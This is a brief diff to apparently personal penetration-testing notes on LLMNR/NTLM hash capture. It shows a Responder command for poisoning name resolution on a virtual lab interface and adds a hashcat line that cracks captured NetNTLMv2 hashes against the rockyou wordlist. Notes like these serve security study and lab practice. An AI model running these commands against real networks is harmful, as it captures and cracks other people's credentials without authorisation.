@@ -10,3 +10,4 @@
     4. Victim then sends its NTLM hash.
  - Needs lot of traffic, so run first thing. 
  - `sudo ./test/bin/python Responder.py -I vboxnet0 -rdwv`
+ - `hashcat -m 5600 hash.txt rockyou.txt`
